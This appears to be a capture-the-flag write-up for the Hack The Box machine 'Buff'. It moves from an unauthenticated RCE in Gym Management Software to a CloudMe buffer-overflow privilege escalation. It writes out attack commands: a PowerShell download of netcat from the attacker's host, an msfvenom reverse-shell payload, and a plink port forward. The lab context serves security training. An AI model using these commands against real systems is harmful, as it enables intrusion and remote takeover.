<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>buff</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#buff">buff</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#gym management software 1.0">gym management software 1.0</a></li>
<ol>
<li><a href="#unauthenticated RCE exploit">unauthenticated RCE exploit</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#privesc w/ Cloud_1112.exe">privesc w/ Cloud_1112.exe</a></li>
<ol>
<li><a href="#searchsploit CloudMe">searchsploit CloudMe</a></li>
<li><a href="#generate shell code">generate shell code</a></li>
<li><a href="#plink">plink</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
</ol></div>
<div class="page" id="buff"><h1><b><u>buff</u></b></h1><img alt="images/1647-1.png" src="images/1647-1.png"/><br/><img alt="images/1647-2.png" src="images/1647-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/1648-1.png" src="images/1648-1.png"/><br/><span style="color:#24ff00;">nmap shows the only service running is http on </span><span style="color:#ffa500;">port 8080</span></div>
<div class="page" id="gym management software 1.0"><h1><b><u>gym management software 1.0</u></b></h1><span style="color:#24ff00;">navigating through the web server's contact.php page, there is a note that Buff's webserver uses Gym Management Software 1.0 to run its webserver.<br/></span><br/><img alt="images/1649-1.png" src="images/1649-1.png"/><br/><br/><br/><span style="color:#24ff00;">Googling </span><span style="color:#ffa500;">Gym Management Software</span><span style="color:#24ff00;"> returns an Unauthenticated Remote Code Execution vulnerability</span><br/><img alt="images/1649-2.png" src="images/1649-2.png"/><br/><br/><img alt="images/1649-3.png" src="images/1649-3.png"/></div>
<div class="page" id="unauthenticated RCE exploit"><h1><b><u>unauthenticated RCE exploit</u></b></h1><img alt="images/1651-1.png" src="images/1651-1.png"/><br/><br/><img alt="images/1651-2.png" src="images/1651-2.png"/><br/><br/><span style="color:#24ff00;">we can look up the exploit locally using </span><span style="color:#ffa500;">searchsploit</span><span style="color:#24ff00;"> and the </span><span style="color:#ffa500;">exploit database ID</span><span style="color:#24ff00;"> number</span><br/><img alt="images/1651-3.png" src="images/1651-3.png"/><br/><br/><br/><span style="color:#ffa500;">python gym_software_exploit.py http://10.10.10.198:8080/ </span><span style="color:#ffff00;">&lt;- don't forget the trailing backslash</span><br/><img alt="images/1651-4.png" src="images/1651-4.png"/><br/><br/><span style="color:#24ff00;">we have a </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">! <br/>But since the shell is limited, lets call a fully functional shell back to our attack machine</span></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">An easy way to do that is to have our victim download </span><span style="color:#ffa500;">netcat</span><span style="color:#24ff00;"> for windows and execute it remotely to call a shell back to us</span><br/><br/><span style="color:#24ff00;">first locate </span><span style="color:#ffa500;">nc.exe </span><span style="color:#24ff00;">and mv it to your working directory and spin up an http server</span><br/><img alt="images/1652-1.png" src="images/1652-1.png"/><br/><img alt="images/1652-2.png" src="images/1652-2.png"/><br/><br/><span style="color:#24ff00;">and have our victim download it </span><br/><span style="color:#ffa500;">powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.13/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')</span><br/><img alt="images/1652-3.png" src="images/1652-3.png"/><br/><img alt="images/1652-4.png" src="images/1652-4.png"/><br/><br/><br/><img alt="images/1652-5.png" src="images/1652-5.png"/><br/><img alt="images/1652-6.png" src="images/1652-6.png"/></div>
<div class="page" id="privesc w/ Cloud_1112.exe"><h1><b><u>privesc w/ Cloud_1112.exe</u></b></h1><span style="color:#24ff00;">looking at our owned user </span><span style="color:#ffff00;">shaun's </span><span style="color:#24ff00;">download folder we see an interesting executable named </span><span style="color:#ffff00;">CloudMe_1112.exe</span><br/><br/><img alt="images/1660-1.png" src="images/1660-1.png"/></div>
<div class="page" id="searchsploit CloudMe"><h1><b><u>searchsploit CloudMe</u></b></h1><img alt="images/1656-1.png" src="images/1656-1.png"/><br/><br/><span style="color:#24ff00;">we'll choose the first exploit and mirror it to our directory with</span> <span style="color:#ffa500;">searchsploit -m windows/remote/48389</span><br/><img alt="images/1656-2.png" src="images/1656-2.png"/></div>
<div class="page" id="generate shell code"><h1><b><u>generate shell code</u></b></h1><span style="color:#24ff00;">since the buffer overflow is mostly already written for us, all we need to do is tweak the shellcode that will call back to our attack machine</span><br/><br/><span style="color:#ffa500;">msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.62 4444' -f py -b '/x00/x0a/x0d' -v payload</span><br/><img alt="images/1657-1.png" src="images/1657-1.png"/><br/><br/><img alt="images/1657-2.png" src="images/1657-2.png"/><br/><br/><span style="color:#24ff00;">now sub out </span><span style="color:#ffa500;">48389's </span><span style="color:#24ff00;">shellcode with our </span><span style="color:#ffa500;">msfvenom</span><span style="color:#24ff00;"> generated shellcode</span><br/><img alt="images/1657-3.png" src="images/1657-3.png"/></div>
<div class="page" id="plink"><h1><b><u>plink</u></b></h1><span style="color:#24ff00;">we want to forward our port to the victim box so we can run the exploit locally on our attacking machine since </span><span style="color:#ffff00;">BUFF</span><span style="color:#24ff00;"> does </span><span style="color:#ff0000;">not support python</span><br/><br/><span style="color:#24ff00;">first download </span><span style="color:#ffa500;">plink</span><span style="color:#24ff00;"> to our windows victim with a powershell</span> <span style="color:#ffa500;">downloadfile</span> <span style="color:#24ff00;">cmd</span><br/><img alt="images/1658-1.png" src="images/1658-1.png"/><br/><img alt="images/1658-2.png" src="images/1658-2.png"/><br/><img alt="images/1658-3.png" src="images/1658-3.png"/><br/><br/><br/><span style="color:#ffa500;">plink.exe -l st0ve -pw 12345 10.10.14.62 -R 8888:127.0.0.1:8888</span><br/><img alt="images/1658-4.png" src="images/1658-4.png"/>+<br/><br/><img alt="images/1658-5.png" src="images/1658-5.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">make sure you set up your listener from user </span><span style="color:#ffff00;">st0ve</span><span style="color:#24ff00;"> since thats what our victim is plinked to</span><br/><br/><br/><span style="color:#24ff00;">we run our exploit which attacks oour localhost (127.0.0.1 on port 8888 which forwards to Buff's port 8888)</span>and....<br/><img alt="images/1659-1.png" src="images/1659-1.png"/><br/><br/><span style="color:#24ff00;">we're </span><span style="color:#ffff00;">root</span><br/><img alt="images/1659-2.png" src="images/1659-2.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1654-1.png" src="images/1654-1.png"/><span style="color:#ffff00;"><br/>29a8c6e451149cf2499ebabeb7aec7d4<br/><br/></span><img alt="images/1654-2.png" src="images/1654-2.png"/><br/>d8f697cf088291568ccf206c16ea3b49</div>
</div></body></html>